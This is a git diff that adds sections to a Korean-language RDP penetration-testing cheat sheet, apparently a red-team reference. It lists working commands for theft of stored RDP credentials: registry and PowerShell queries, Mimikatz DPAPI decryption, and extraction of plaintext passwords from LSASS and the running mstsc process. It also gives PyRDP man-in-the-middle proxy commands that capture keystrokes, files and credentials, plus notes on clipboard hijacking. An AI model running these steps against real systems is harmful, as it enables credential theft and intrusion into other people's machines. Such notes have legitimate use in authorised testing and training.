@@ -101,3 +101,69 @@ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
     - Security 이벤트 로그: 4624 (Type 10 = RemoteInteractive)
     - TerminalServices-RemoteConnectionManager: 1149
     - TerminalServices-LocalSessionManager: 21, 22
+
+---
+
+## 저장된 RDP credential 탈취
+
+### .rdp 파일 / Credential Manager
+
+```powershell
+# 저장된 RDP 히스토리
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
+
+# 저장된 .rdp 파일
+Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.rdp -Force
+
+# Credential Manager 에 저장된 "TERMSRV/..." credential (DPAPI 암호화)
+cmdkey /list | Select-String TERMSRV
+```
+
+### Mimikatz 로 복호화
+
+```text
+# DPAPI 마스터키 추출 (사용자 컨텍스트)
+privilege::debug
+sekurlsa::dpapi           # LSASS 에서 masterkey 추출
+
+# credential blob 복호화
+dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<GUID>
+dpapi::cred /in:... /masterkey:<MASTERKEY>
+
+# 실행 중인 mstsc 에서 평문 추출
+ts::mstsc                 # 현재 session의 mstsc 프로세스에서 패스워드 긁기
+```
+
+---
+
+## PyRDP MITM
+
+조건: 공격자가 target과 RDP 서버 사이 경로(ARP spoofing, DNS hijack, 사내 man-in-the-middle 등)를 가질 때.
+
+```bash
+# PyRDP - 투명 MITM 프록시 (키 입력 / 클립보드 / 파일 / 크리덴셜 캡처)
+pyrdp-mitm.py RDP_SERVER_IP
+pyrdp-mitm.py RDP_SERVER_IP -o /tmp/pyrdp --no-replay
+
+# 저장 위치
+# /tmp/pyrdp/replays/     - session 리플레이 (Shadow 재생)
+# /tmp/pyrdp/files/       - 클립보드/드라이브 전송 파일
+# pyrdp-mitm.log          - 입력된 credential 평문
+
+# session 재생
+pyrdp-player.py replay.pyrdp
+```
+
+---
+
+## 클립보드 하이재킹
+
+```text
+# RDP 클립보드는 기본 양방향. 공격자 호스트에서 target의 클립보드 내용 스니핑 가능
+# xfreerdp 에서 클립보드 공유 활성: +clipboard
+# PyRDP / ScreenConnect 기반 도구로 클립보드 로깅 가능
+```
+
+!!! warning "정책"
+    클립보드 / 드라이브 리다이렉션은 GPO `Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services` 에서 차단되어 있으면 사용 불가.
